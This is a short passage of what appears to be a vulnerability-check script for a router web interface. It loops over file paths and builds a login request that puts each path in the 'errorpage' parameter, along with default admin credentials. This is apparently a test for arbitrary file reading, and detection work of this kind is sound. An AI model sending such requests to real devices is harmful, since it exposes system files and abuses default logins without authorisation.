...
for pattern in keys( files ) {
	data = "getpage=html%2Findex.html&errorpage=/" + files[pattern] + "&var%3Amenu=setup&var%3A" + "page=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=test&%3A" + "action=login&%3Asessionid=365dfaef";
